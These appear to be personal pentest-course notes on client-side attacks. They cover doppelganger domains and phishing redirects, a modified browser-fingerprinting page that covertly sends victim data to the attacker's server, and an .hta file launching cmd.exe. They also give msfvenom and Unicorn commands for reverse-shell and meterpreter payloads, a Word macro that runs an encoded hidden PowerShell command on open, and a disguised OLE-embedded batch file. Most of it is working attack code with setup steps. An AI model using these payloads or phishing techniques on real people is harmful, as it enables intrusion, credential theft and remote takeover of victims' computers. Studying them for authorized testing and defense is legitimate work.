Client Side Attacks:
====================
Social Engineering:
	Why?
		Client Side Attacks requires Social Engineering.
Doppleganger Domains:
	Doppelganger domains are ones that are spelled almost identical to legitimate domains, but differ slightly, such as a missing period separating a subdomain name from a primary domain name, example:
		us.company.com => uscompany.com
	If we own Doppelganger domains, we can get some web traffic meant for the actual domain
	SMTP Attack:(MITMB)(Man In The MailBox)	
		Suppose, we have mail.ru.com => mailru.com. We configure SMTP server on mailru.com
Phishing:	
	auto downloading a file, no permisssn required:
		create a random webpage
		add the following code in it
			<script document.location.href="link";></script>
		or
		<meta http-equinv="refresh" content="0"; url="">
	Phishing Campaigns:
		Metasploit Pro:
			it has a phishing module
			it creates a link for login page, which we send using email to victims
			it also keep tracks of how many users opened email, how many clicked the link, how many typed thier creds
		SET: read SET:Social Engineering Attacks:Website Attack Vectors: Credential Harvester
		To make a massive phishing campaign:
			GoDaddy's SMTP sever
SET:(Social Engineering Toolkit)
	reports are saved in /root/.set/reports/
	Three Types of Attack Categories:
		Social Engineering Attacks (main )
		Penetration Testing (Fast-Track)
		Third Party Modules
	Social Engineering Attacks:
		Website Attack Vectors:
			Credential Harvester:
				it will help us in cloning in a site
				if victim goes to our ip -> he will see that link
			SET JAVA Attack:
				it will make a java payload, which will download to excute a meterpreter shell on victim host
Client FingerPrinting:
	This helps us to know what exploit to use.
	Using WebBrowser:
		Web browsers are generally a good vector for collecting information on the target
		We grab info such as OS version, browser info, etc.
		fingerprintjs2:
			Usage:
				wget https://github.com/Valve/fingerprintjs2/archive/master.zip
				unzip master.zip
				Understanding index.html:
					index.html
						<!doctype html>
						<html>
						<head>
							<title>Fingerprintjs2 test</title>
						</head>
						<body>
							<h1>Fingerprintjs2</h1>
							<p>Your browser fingerprint: <strong id="fp"></strong></p>
							<p><code id="time"/></p>
							<p><span id="details"/></p>
							<script src="fingerprint2.js"></script>
							<script>
								var d1 = new Date();
								var options = {};
								Fingerprint2.get(options, function (components) {
									var values = components.map(function (component) { return component.value })
									var murmur = Fingerprint2.x64hash128(values.join(''), 31)
									var d2 = new Date();
									var timeString = "Time to calculate the fingerprint: " + (d2 - d1) + "ms";
									var details = "<strong>Detailed information: </strong><br />";
									if(typeof window.console !== "undefined") {
										for (var index in components) {
											var obj = components[index];
											var value = obj.value;
												if (value !== null) {
												var line = obj.key + " = " + value.toString().substr(0, 150);
												details += line + "<br />";	
												}
										}
									}
									document.querySelector("#details").innerHTML = details
									document.querySelector("#fp").textContent = murmur
									document.querySelector("#time").textContent = timeString
								});
							</script>
						</body>
						</html>
					Explanation:	
						it uses fingerprint2.js library
						it has "components" array variable which gets reurbed by library and stores all the info extracted by the script
						The values stored in the components array are passed to the murmur hash function in order to create a hash fingerprint of the browser
				Editing index.html and making js.php:
					Why?
						Bcoz original index.html shows the info gathered to the client, not to us, the attacker. 
					index.html:
						<!doctype html>
						<html>
						<head>
							<title>Blank Page</title>
						</head>
						<body>
							<h1>You have been given the finger!</h1>
							<script src="fingerprint2.js"></script>
							<script>
								var d1 = new Date();
								var options = {};
								Fingerprint2.get(options, function (components) {
									var values = components.map(function (component) { return component.value })
									var murmur = Fingerprint2.x64hash128(values.join(''), 31)
										var clientfp = "Client browser fingerprint: " + murmur + "\n\n";
									var d2 = new Date();
									var timeString = "Time to calculate fingerprint: " + (d2 - d1) + "ms\n\n";
									var details = "Detailed information: \n";
									if(typeof window.console !== "undefined") {
										for (var index in components) {
											var obj = components[index];
											var value = obj.value;
												if (value !== null) {
												var line = obj.key + " = " + value.toString().substr(0, 150);
												details += line + "\n";
												}
										}
									}
									var xmlhttp = new XMLHttpRequest();
									xmlhttp.open("POST", "/fp/js.php");
									xmlhttp.setRequestHeader("Content-Type", "application/txt");
									xmlhttp.send(clientfp + timeString + details);
								});
							</script>
						</body>
						</html>
					js.php:
						<?php
						$data = "Client IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
						$data .= file_get_contents('php://input');
						$data .= "---------------------------------\n\n";
						file_put_contents('/var/www/html/fp/fingerprint.txt', print_r($data, true),
						FILE_APPEND | LOCK_EX);
						?>	
					Explanation:
						we use the XMLHttpRequest JavaScript API to interact with the attacking web server via a POST request. The POST request is issued against the same server where the malicious web page is stored, therefore the URL used in the xmlhttp.open method does not specify an IP address.
						The only text our victim (client) can see is "You have been given the finger!" (which is a heading marked by <h1></h1> in index.html)
						js.php processes the POST request on the attacking server
				mkdir fp
				Transfer the files to /var/www/html/fp
				sudo chmown www-data:www-data fp
					In order for this code to work, we need to allow the Apache www-data user to write to the fp directory
				service apach2 start
				This script will give us a lot of information including "user-agent" script.
				Go to "https://developers.whatismybrowser.com/useragents/parse/" and paste the user agent => this will tell us about browser info.
HTML Applications:(.hta)
	Basics:
		This attack vector only works against Internet Explorer and to some extent Microsoft Edge
		The purpose of HTML Applications is to allow arbitrary execution of applications directly from Internet Explorer, rather than downloading and manually running an executable. IE automatically executes .hta files using mshta.exe(Microsoft-signed binary) outside the browser bcoz of the security boundaries
	Manual Exploitation:	
		exploit.hta:
			<html>
			<head>
				<script>
					var c= 'cmd.exe'
					new ActiveXObject('WScript.Shell').Run(c);
				</script>
			</head>
			<body>
				<script>
					self.close();
				</script>
			</body>			
			</html>
		Explanation:
			we use ActiveXObjects which can provide access to os commands. This can be achieved through the Windows Script (WScript) and we can invoke its run method to launch an application on client.
			While mshta.exe is executing, it keeps an additional window open behind our command prompt. To avoid this, we can update our proof-of-concept to close this window with the .close() .
		Once a victim accesses this file using Internet Explorer, they will be presented with the popup dialog to open file or not, Selecting Open will prompt an additional dialog	because of the sandbox protection of IE aka Protected Mode (which is enabled by default), The victim can select Allow to permit the action, which will execute the JavaScript code and launch cmd.exe
	Using msfvenom:
		msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o evil.hta
		This will create a poweshell based hta file
Microsoft Office:
	Macros
		Basics:
			Word and Excel allow users to embed macros, a series ofcommands and instructions that are grouped together to accomplish a task programmatically
			macros can be written from scratch in VBA(Visual Basic for Applications), which is a fully functional scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.
		Getting the VBA script:
			msfvenom -p windows/meterpreter/reverse_https lhost=ip lport=1234 -f vba
			Unicorn:(github.com/trustedsec/unicorn.git)
				unicorn.py windows/meterpreter/reverse_https my_ip 443 macro
					this will give a file "powershell_attack.txt" containg macro
					use multi/handler
					set payload windows/meterpreter/reverse_https
					set LHOST 0.0.0.0
					set LPORT 443
					set ExitOnSession false
					set EnableStageEncoding true
					exploit -j
		Creating Macro in Word:
			open word file (either .docm or .doc (.docx wont work))
				View -> macro -> create
				Name of Macro => MyMacro
				Content:
					Sub AutoOpen()
						MyMacro
					End Sub
					Sub Document_Open()
						MyMacro
					End Sub
					Sub MyMacro()
						Dim Str As String
						Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
						Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
						Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
						Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
						Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
						Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
						...
						Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
						Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
						Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
						Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
						Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
						Str = Str + "QA="
						CreateObject("Wscript.Shell").Run Str
					End Sub
				Explanation of content:
					The main procedure used in our VBA macro begins with the keyword Sub353 and ends with End Sub. This essentially marks the body of our macro. MyMacro() is simply a procedure
					To invoke the Windows Scripting Host through ActiveX as we did earlier, we can use the CreateObject function along with the Wscript.Shell Run method.
					Since Office macros are not executed automatically, we must make use of two predefined procedures:
						AutoOpen procedure:
							Its executed when a new document is opened 
						Document_Open procedure:
							Its executed when an already-open document is reopened
					we have declared a variable "Dim" of type String containing the PowerShell command we wish to execute, We could embed the base64-encoded PowerShell script as a single String, but VBA has a 255-character limit for literal strings. This restriction does not apply to strings stored in variables, so we can split the command into multiple lines and concatenate them using this python script:
						str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."
						n = 50
						for i in range(0, len(str), n):
							print "Str = Str + " + '"' + str[i:i+n] + '"'
					And we can use the PowerShell payload from the HTA attack or create it as explained above.
		Creating Macro in Excel file:	
			open excel file (either .xls or .xslm (.xlsx won't work))
				View -> Macros -> Create
		Note:
			Microsoft has added security, so, the victim needs to ENABLE macros for our exploit to work
	Object Linking and Embedding:
		Office has a vuln, Dynamic Data Exchange (DDE), it was patched in 2017. However, we can still leverage Object Linking and Embedding (OLE) to abuse Microsoft Office’s document-embedding feature.
		we are going to embed a Windows batch file(launch.bat) inside a Microsoft Word document.
		launch.bat:
			START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....
		Go to word file:
			Insert -> object -> create from file -> select launch.bat
			We can also change the appearance of the batch file within the Word document to make it look more benign. To do this, we simply check the Display as icon check box and choose Change Icon, which brings up the menu box, allowing us to make changes.
			This, will embed the file into word document and the client will need to double click to open this file.